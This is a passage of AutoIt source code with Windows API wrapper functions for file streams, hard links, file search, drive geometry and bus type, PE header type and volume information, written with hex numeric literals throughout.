    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 0x8000, "uint", 0x16)
    If @error Then $ierror = @error
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
    If $ierror Then Return SetError($ierror, 0x0, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Local $tfsi, $ilength = 0x0, $ioffset = 0x0
    Do
        $ilength += $ioffset
        $tfsi = DllStructCreate("ulong;ulong;int64;int64;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 0x4), 0x1) / 0x2) & "]", $pdata + $ilength)
        __INC($adata)
        $adata[$adata[0x0][0x0]][0x0] = DllStructGetData($tfsi, 0x5)
        $adata[$adata[0x0][0x0]][0x1] = DllStructGetData($tfsi, 0x3)
        $ioffset = DllStructGetData($tfsi, 0x1)
    Until Not $ioffset
    __INC($adata, +0xffffffff)
    Return $adata
EndFunc   ;==>_WINAPI_ENUMFILESTREAMS
Func _WinAPI_EnumHardLinks($sfilepath)
    Local $tdata = DllStructCreate("byte[32768]")
    Local $pdata = DllStructGetPtr($tdata)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, 0x0, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $ierror = 0x0
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 0x8000, "uint", 0x2e)
    If @error Or $acall[0x0] Then
        $ierror = @error + 0xa
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        If $acall Then Return SetError($ierror, 0x0, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $ierror, 0x0)
    EndIf
    Local $icount = DllStructGetData(DllStructCreate("ulong;ulong", $pdata), 0x2)
    Local $adata[$icount + 0x1] = [$icount]
    Local $tflei, $hpath, $spath, $ilength = 0x8
    For $i = 0x1 To $icount
        $tflei = DllStructCreate("ulong;int64;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 0x10), 0x1)) & "]", $pdata + $ilength)
        $ierror = 0x0
        Do
            $hpath = _WinAPI_OpenFileById($hfile, DllStructGetData($tflei, 0x2), 0x100080, $file_share_readwrite, $file_flag_backup_semantics)
            If @error Then
                $ierror = @error + 0x64
                ExitLoop
            EndIf
            $spath = _WinAPI_GetFinalPathNameByHandleEx($hpath)
            If @error Then
                $ierror = @error + 0xc8
                ExitLoop
            EndIf
        Until 0x1
        If $hpath Then
            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hpath)
        EndIf
        If $ierror Then ExitLoop
        $adata[$i] = _WinAPI_PathAppend($spath, DllStructGetData($tflei, 0x4))
        $ilength += DllStructGetData($tflei, 0x1)
    Next
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
    If $ierror Then Return SetError($ierror, 0x0, 0x0)
    Return $adata
EndFunc   ;==>_WINAPI_ENUMHARDLINKS
Func _WinAPI_FileEncryptionStatus($sfilepath)
    Local $acall = DllCall("advapi32.dll", "bool", "FileEncryptionStatusW", "wstr", $sfilepath, "dword*", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, +0xffffffff)
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_FILEENCRYPTIONSTATUS
Func _WinAPI_FileExists($sfilepath)
    If Not FileExists($sfilepath) Then Return 0x0
    If _WinAPI_PathIsDirectory($sfilepath) Then Return SetExtended(0x1, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_FILEEXISTS
Func _WinAPI_FileInUse($sfilepath)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, $generic_read)
    If @error Then
        If @extended = 0x20 Then Return 0x1
        Return SetError(@error, @extended, 0x0)
    EndIf
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
    Return 0x0
EndFunc   ;==>_WINAPI_FILEINUSE
Func _WinAPI_FindClose($hsearch)
    Local $acall = DllCall("kernel32.dll", "bool", "FindClose", "handle", $hsearch)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDCLOSE
Func _WinAPI_FindCloseChangeNotification($hchange)
    Local $acall = DllCall("kernel32.dll", "bool", "FindCloseChangeNotification", "handle", $hchange)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDCLOSECHANGENOTIFICATION
Func _WinAPI_FindFirstChangeNotification($sdirectory, $iflags, $bsubtree = False)
    Local $acall = DllCall("kernel32.dll", "handle", "FindFirstChangeNotificationW", "wstr", $sdirectory, "bool", $bsubtree, "dword", $iflags)
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then Return SetError(@error + 0xa, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDFIRSTCHANGENOTIFICATION
Func _WinAPI_FindFirstFile($sfilepath, $tdata)
    Local $acall = DllCall("kernel32.dll", "handle", "FindFirstFileW", "wstr", $sfilepath, "struct*", $tdata)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] = Ptr(+0xffffffff) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDFIRSTFILE
Func _WinAPI_FindFirstFileName($sfilepath, ByRef $slink)
    $slink = ""
    Local $acall = DllCall("kernel32.dll", "handle", "FindFirstFileNameW", "wstr", $sfilepath, "dword", 0x0, "dword*", 0x1000, "wstr", "")
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then Return SetError(@error + 0xa, @extended, 0x0)
    $slink = $acall[0x4]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDFIRSTFILENAME
Func _WinAPI_FindFirstStream($sfilepath, $tdata)
    Local $acall = DllCall("kernel32.dll", "handle", "FindFirstStreamW", "wstr", $sfilepath, "uint", 0x0, "struct*", $tdata, "dword", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] = Ptr(+0xffffffff) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDFIRSTSTREAM
Func _WinAPI_FindNextChangeNotification($hchange)
    Local $acall = DllCall("kernel32.dll", "bool", "FindNextChangeNotification", "handle", $hchange)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDNEXTCHANGENOTIFICATION
Func _WinAPI_FindNextFile($hsearch, $tdata)
    Local $acall = DllCall("kernel32.dll", "bool", "FindNextFileW", "handle", $hsearch, "struct*", $tdata)
    If @error Then Return SetError(@error, @extended, False)
    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDNEXTFILE
Func _WinAPI_FindNextFileName($hsearch, ByRef $slink)
    $slink = ""
    Local $acall = DllCall("kernel32.dll", "bool", "FindNextFileNameW", "handle", $hsearch, "dword*", 0x1000, "wstr", "")
    If @error Then Return SetError(@error, @extended, False)
    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    $slink = $acall[0x3]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDNEXTFILENAME
Func _WinAPI_FindNextStream($hsearch, $tdata)
    Local $acall = DllCall("kernel32.dll", "bool", "FindNextStreamW", "handle", $hsearch, "struct*", $tdata)
    If @error Then Return SetError(@error, @extended, False)
    If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FINDNEXTSTREAM
Func _WinAPI_FlushFileBuffers($hfile)
    Local $acall = DllCall("kernel32.dll", "bool", "FlushFileBuffers", "handle", $hfile)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FLUSHFILEBUFFERS
Func _WinAPI_FlushViewOfFile($paddress, $ibytes = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "FlushViewOfFile", "struct*", $paddress, "dword", $ibytes)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_FLUSHVIEWOFFILE
Func _WinAPI_GetBinaryType($sfilepath)
    Local $acall = DllCall("kernel32.dll", "int", "GetBinaryTypeW", "wstr", $sfilepath, "dword*", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    If Not $acall[0x0] Then $acall[0x2] = 0x0
    Return SetExtended($acall[0x2], $acall[0x0])
EndFunc   ;==>_WINAPI_GETBINARYTYPE
Func _WinAPI_GetCDType($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $tagscsi_pass_through = "struct;ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;ulong DataTransferLength;ulong TimeOutValue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16];endstruct"
    Local $tspt = DllStructCreate($tagscsi_pass_through & ";byte Hdr[8]")
    Local $tcdb = DllStructCreate("byte;byte;byte[2];byte[3];byte[2];byte;byte[2];byte[4]", DllStructGetPtr($tspt, "Cdb"))
    Local $thdr = DllStructCreate("byte[4];byte;byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
    Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
    DllStructSetData($tspt, "Length", $isize)
    DllStructSetData($tspt, "ScsiStatus", 0x0)
    DllStructSetData($tspt, "PathId", 0x0)
    DllStructSetData($tspt, "TargetId", 0x0)
    DllStructSetData($tspt, "Lun", 0x0)
    DllStructSetData($tspt, "CdbLength", 0xc)
    DllStructSetData($tspt, "SenseInfoLength", 0x0)
    DllStructSetData($tspt, "DataIn", 0x1)
    DllStructSetData($tspt, "DataTransferLength", 0x8)
    DllStructSetData($tspt, "TimeOutValue", 0x15180)
    DllStructSetData($tspt, "DataBufferOffset", $isize)
    DllStructSetData($tspt, "SenseInfoOffset", 0x0)
    DllStructSetData($tcdb, 0x1, 0x46)
    DllStructSetData($tcdb, 0x2, 0x0)
    DllStructSetData($tcdb, 0x3, 0x0, 0x1)
    DllStructSetData($tcdb, 0x3, 0x0, 0x2)
    DllStructSetData($tcdb, 0x5, 0x0, 0x1)
    DllStructSetData($tcdb, 0x5, 0x8, 0x2)
    DllStructSetData($tcdb, 0x6, 0x0)
    DllStructSetData($tcdb, 0x7, 0x0, 0x1)
    DllStructSetData($tcdb, 0x7, 0x0, 0x2)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x4d004, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Return BitOR(BitShift(DllStructGetData($thdr, 0x4, 0x1), +0xfffffff8), DllStructGetData($thdr, 0x4, 0x2))
EndFunc   ;==>_WINAPI_GETCDTYPE
Func _WinAPI_GetCompressedFileSize($sfilepath)
    Local $acall = DllCall("kernel32.dll", "dword", "GetCompressedFileSizeW", "wstr", $sfilepath, "dword*", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] = +0xffffffff Then
        Local $ilasterror = _WinAPI_GetLastError()
        If $acall[0x2] = 0x0 Then Return SetError(0xa, $ilasterror, 0x0)
        If $ilasterror Then Return SetError(0xb, $ilasterror, 0x0)
    EndIf
    Return __WINAPI_MAKEQWORD($acall[0x0], $acall[0x2])
EndFunc   ;==>_WINAPI_GETCOMPRESSEDFILESIZE
Func _WinAPI_GetCompression($sfilepath)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, $generic_read, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9003c, "ptr", 0x0, "dword", 0x0, "ushort*", 0x0, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, +0xffffffff)
    Return $acall[0x5]
EndFunc   ;==>_WINAPI_GETCOMPRESSION
Func _WinAPI_GetCurrentDirectory()
    Local $acall = DllCall("kernel32.dll", "dword", "GetCurrentDirectoryW", "dword", 0x1000, "wstr", "")
    If @error Then Return SetError(@error, @extended, "")
    Return SetExtended($acall[0x0], $acall[0x2])
EndFunc   ;==>_WINAPI_GETCURRENTDIRECTORY
Func _WinAPI_GetDiskFreeSpaceEx($sdrive)
    Local $acall = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceEx", "str", $sdrive, "int64*", 0x0, "int64*", 0x0, "int64*", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $aret[0x3]
    For $i = 0x0 To 0x2
        $aret[$i] = $acall[$i + 0x2]
    Next
    Return $aret
EndFunc   ;==>_WINAPI_GETDISKFREESPACEEX
Func _WinAPI_GetDriveBusType($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, 0x0, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, +0xffffffff)
    Local $tagstorage_property_query = "ulong PropertyId;ulong QueryType;byte AdditionalParameters[1]"
    Local $tspq = DllStructCreate($tagstorage_property_query)
    Local $tsdd = DllStructCreate("ulong Version;ulong Size;byte DeviceType;byte DeviceTypeModifier;byte RemovableMedia;byte CommandQueueing;ulong VendorIdOffset;ulong ProductIdOffset;ulong ProductRevisionOffset;ulong SerialNumberOffset;ulong BusType;ulong RawPropertiesLength;byte RawDeviceProperties[1]")
    DllStructSetData($tspq, "PropertyId", 0x0)
    DllStructSetData($tspq, "QueryType", 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d1400, "struct*", $tspq, "dword", DllStructGetSize($tspq), "struct*", $tsdd, "dword", DllStructGetSize($tsdd), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, +0xffffffff)
    Return DllStructGetData($tsdd, "BusType")
EndFunc   ;==>_WINAPI_GETDRIVEBUSTYPE
Func _WinAPI_GetDriveGeometryEx($idrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\PhysicalDrive" & $idrive, $open_existing, 0x0, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $tdgex = DllStructCreate("uint64;dword;dword;dword;dword;uint64")
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x700a0, "ptr", 0x0, "dword", 0x0, "struct*", $tdgex, "dword", DllStructGetSize($tdgex), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Local $aret[0x6]
    For $i = 0x0 To 0x5
        $aret[$i] = DllStructGetData($tdgex, $i + 0x1)
    Next
    Return $aret
EndFunc   ;==>_WINAPI_GETDRIVEGEOMETRYEX
Func _WinAPI_GetDriveNumber($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, 0x0, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $tsdn = DllStructCreate("dword;dword;dword")
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d1080, "ptr", 0x0, "dword", 0x0, "struct*", $tsdn, "dword", DllStructGetSize($tsdn), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Local $aret[0x3]
    For $i = 0x0 To 0x2
        $aret[$i] = DllStructGetData($tsdn, $i + 0x1)
    Next
    Return $aret
EndFunc   ;==>_WINAPI_GETDRIVENUMBER
Func _WinAPI_GetDriveType($sdrive = "")
    If Not StringStripWS($sdrive, $str_stripleading + $str_striptrailing) Then $sdrive = Null
    Local $acall = DllCall("kernel32.dll", "uint", "GetDriveType", "str", $sdrive)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETDRIVETYPE
Func _WinAPI_GetFileAttributes($sfilepath)
    Local $acall = DllCall("kernel32.dll", "dword", "GetFileAttributesW", "wstr", $sfilepath)
    If @error Or ($acall[0x0] = 0xffffffff) Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETFILEATTRIBUTES
Func _WinAPI_GetFileID($hfile)
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0x0, "ulong", 0x8, "uint", 0x6)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return $acall[0x3]
EndFunc   ;==>_WINAPI_GETFILEID
Func _WinAPI_GetFileInformationByHandle($hfile)
    Local $tbhfi = DllStructCreate("dword;dword[2];dword[2];dword[2];dword;dword;dword;dword;dword;dword")
    Local $acall = DllCall("kernel32.dll", "bool", "GetFileInformationByHandle", "handle", $hfile, "struct*", $tbhfi)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $aret[0x8]
    $aret[0x0] = DllStructGetData($tbhfi, 0x1)
    For $i = 0x1 To 0x3
        If DllStructGetData($tbhfi, $i + 0x1) Then
            $aret[$i] = DllStructCreate($tagfiletime)
            _WinAPI_MoveMemory($aret[$i], DllStructGetPtr($tbhfi, $i + 0x1), 0x8)
        Else
            $aret[$i] = 0x0
        EndIf
    Next
    $aret[0x4] = DllStructGetData($tbhfi, 0x5)
    $aret[0x5] = __WINAPI_MAKEQWORD(DllStructGetData($tbhfi, 0x7), DllStructGetData($tbhfi, 0x6))
    $aret[0x6] = DllStructGetData($tbhfi, 0x8)
    $aret[0x7] = __WINAPI_MAKEQWORD(DllStructGetData($tbhfi, 0x9), DllStructGetData($tbhfi, 0xa))
    Return $aret
EndFunc   ;==>_WINAPI_GETFILEINFORMATIONBYHANDLE
Func _WinAPI_GetFileInformationByHandleEx($hfile)
    Local $tfi = DllStructCreate($tagfileinfo)
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfi, "ulong", DllStructGetSize($tfi), "uint", 0x4)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return $tfi
EndFunc   ;==>_WINAPI_GETFILEINFORMATIONBYHANDLEEX
Func _WinAPI_GetFilePointerEx($hfile)
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0x0, "ulong", 0x8, "uint", 0xe)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Return $acall[0x3]
EndFunc   ;==>_WINAPI_GETFILEPOINTEREX
Func _WinAPI_GetFileSizeEx($hfile)
    Local $acall = DllCall("kernel32.dll", "bool", "GetFileSizeEx", "handle", $hfile, "int64*", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, +0xffffffff)
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_GETFILESIZEEX
Func _WinAPI_GetFileSizeOnDisk($sfilepath)
    Local $isize = FileGetSize($sfilepath)
    If @error Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceW", "wstr", _WinAPI_PathStripToRoot(_WinAPI_GetFullPathName($sfilepath)), "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
    Return Ceiling($isize / ($acall[0x2] * $acall[0x3])) * ($acall[0x2] * $acall[0x3])
EndFunc   ;==>_WINAPI_GETFILESIZEONDISK
Func _WinAPI_GetFileTitle($sfilepath)
    Local $acall = DllCall("comdlg32.dll", "short", "GetFileTitleW", "wstr", $sfilepath, "wstr", "", "word", 0x1000)
    If @error Or $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_GETFILETITLE
Func _WinAPI_GetFileType($hfile)
    Local $acall = DllCall("kernel32.dll", "dword", "GetFileType", "handle", $hfile)
    If @error Then Return SetError(@error, @extended, +0xffffffff)
    Local $ilasterror = _WinAPI_GetLastError()
    If Not $acall[0x0] And $ilasterror Then Return SetError(0xa, $ilasterror, +0xffffffff)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETFILETYPE
Func _WinAPI_GetFinalPathNameByHandle($hfile)
    Local $tfni = DllStructCreate("ulong;wchar[4096]")
    Local $tiosb = DllStructCreate("ptr;ulong_ptr")
    Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfni, "ulong", DllStructGetSize($tfni), "uint", 0x9)
    If @error Then Return SetError(@error, @extended, "")
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], "")
    Local $ilength = DllStructGetData($tfni, 0x1)
    If Not $ilength Then Return SetError(0xc, 0x0, "")
    Return DllStructGetData(DllStructCreate("wchar[" & ($ilength / 0x2) & "]", DllStructGetPtr($tfni, 0x2)), 0x1)
EndFunc   ;==>_WINAPI_GETFINALPATHNAMEBYHANDLE
Func _WinAPI_GetFinalPathNameByHandleEx($hfile, $iflags = 0x0)
    Local $acall = DllCall("kernel32.dll", "dword", "GetFinalPathNameByHandleW", "handle", $hfile, "wstr", "", "dword", 0x1000, "dword", $iflags)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_GETFINALPATHNAMEBYHANDLEEX
Func _WinAPI_GetFullPathName($sfilepath)
    Local $acall = DllCall("kernel32.dll", "dword", "GetFullPathNameW", "wstr", $sfilepath, "dword", 0x1000, "wstr", "", "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, "")
    Return $acall[0x3]
EndFunc   ;==>_WINAPI_GETFULLPATHNAME
Func _WinAPI_GetLogicalDrives()
    Local $acall = DllCall("kernel32.dll", "dword", "GetLogicalDrives")
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETLOGICALDRIVES
Func _WinAPI_GetObjectID($sfilepath)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, 0x0, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $tfoid = DllStructCreate("byte[16];byte[48]")
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9009c, "ptr", 0x0, "dword", 0x0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Local $tguid = DllStructCreate($tagguid)
    _WinAPI_MoveMemory($tguid, $tfoid, 0x10)
    Return $tguid
EndFunc   ;==>_WINAPI_GETOBJECTID
Func _WinAPI_GetOverlappedResult($hfile, $toverlapped, ByRef $ibytes, $bwait = False)
    Local $acall = DllCall("kernel32.dll", "bool", "GetOverlappedResult", "handle", $hfile, "struct*", $toverlapped, "dword*", 0x0, "bool", $bwait)
    If @error Then Return SetError(@error, @extended, False)
    $ibytes = $acall[0x3]
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_GETOVERLAPPEDRESULT
Func _WinAPI_GetPEType($sfilepath)
    Local $tdata = DllStructCreate("ushort[2]")
    Local $tuint = DllStructCreate("uint", DllStructGetPtr($tdata))
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, $generic_read, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $ierror = 0x0, $ival
    Do
        Local $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
        If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x2) Then
            $ierror = @error + 0x1e
            ExitLoop
        EndIf
        $ival = DllStructGetData($tdata, 0x1, 0x1)
        If $ival <> 0x5a4d Then
            $ierror = 0x3
            ExitLoop
        EndIf
        If Not _WinAPI_SetFilePointerEx($hfile, 0x3c) Then
            $ierror = @error + 0x28
            ExitLoop
        EndIf
        $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x4, "dword*", 0x0, "ptr", 0x0)
        If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x4) Then
            $ierror = @error + 0x32
            ExitLoop
        EndIf
        If Not _WinAPI_SetFilePointerEx($hfile, DllStructGetData($tuint, 0x1)) Then
            $ierror = @error + 0x3c
            ExitLoop
        EndIf
        $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x4, "dword*", 0x0, "ptr", 0x0)
        If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x4) Then
            $ierror = @error + 0x46
            ExitLoop
        EndIf
        $ival = DllStructGetData($tuint, 0x1)
        If $ival <> 0x4550 Then
            $ierror = 0x4
            ExitLoop
        EndIf
        $acall = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
        If @error Or (Not $acall[0x0]) Or ($acall[0x4] <> 0x2) Then
            $ierror = @error + 0x50
            ExitLoop
        EndIf
        $ival = DllStructGetData($tdata, 0x1, 0x1)
    Until 0x1
    DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
    If $ierror Then Return SetError($ierror, 0x0, 0x0)
    Return $ival
EndFunc   ;==>_WINAPI_GETPETYPE
Func _WinAPI_GetProfilesDirectory()
    Local $acall = DllCall("userenv.dll", "bool", "GetProfilesDirectoryW", "wstr", "", "dword*", 0x1000)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x1]
EndFunc   ;==>_WINAPI_GETPROFILESDIRECTORY
Func _WinAPI_GetTempFileName($sfilepath, $sprefix = "")
    Local $acall = DllCall("kernel32.dll", "uint", "GetTempFileNameW", "wstr", $sfilepath, "wstr", $sprefix, "uint", 0x0, "wstr", "")
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x4]
EndFunc   ;==>_WINAPI_GETTEMPFILENAME
Func _WinAPI_GetVolumeInformation($sroot = "")
    If Not StringStripWS($sroot, $str_stripleading + $str_striptrailing) Then $sroot = Null
    Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeInformationW", "wstr", $sroot, "wstr", "", "dword", 0x1000, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "wstr", "", "dword", 0x1000)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $aret[0x5]
    For $i = 0x0 To 0x4
        Switch $i
            Case 0x0
                $aret[$i] = $acall[0x2]
            Case Else
                $aret[$i] = $acall[$i + 0x3]
        EndSwitch
    Next
    Return $aret
EndFunc   ;==>_WINAPI_GETVOLUMEINFORMATION
Func _WinAPI_GetVolumeInformationByHandle($hfile)
    Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeInformationByHandleW", "handle", $hfile, "wstr", "", "dword", 0x1000, "dword*", 0x0, "dword*", 0x0, "dword*", 0x0, "wstr", "", "dword", 0x1000)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
    Local $aret[0x5]
    For $i = 0x0 To 0x4
        Switch $i
            Case 0x0
                $aret[$i] = $acall[0x2]
            Case Else
                $aret[$i] = $acall[$i + 0x3]
        EndSwitch
    Next
    Return $aret
EndFunc   ;==>_WINAPI_GETVOLUMEINFORMATIONBYHANDLE
Func _WinAPI_GetVolumeNameForVolumeMountPoint($smountedpath)
    Local $acall = DllCall("kernel32.dll", "bool", "GetVolumeNameForVolumeMountPointW", "wstr", $smountedpath, "wstr", "", "dword", 0x50)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x2]
EndFunc   ;==>_WINAPI_GETVOLUMENAMEFORVOLUMEMOUNTPOINT
Func _WinAPI_IOCTL($idevicetype, $ifunction, $imethod, $iaccess)
    Return BitOR(BitShift($idevicetype, +0xfffffff0), BitShift($iaccess, +0xfffffff2), BitShift($ifunction, +0xfffffffe), $imethod)
EndFunc   ;==>_WINAPI_IOCTL
Func _WinAPI_IsDoorOpen($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, False)
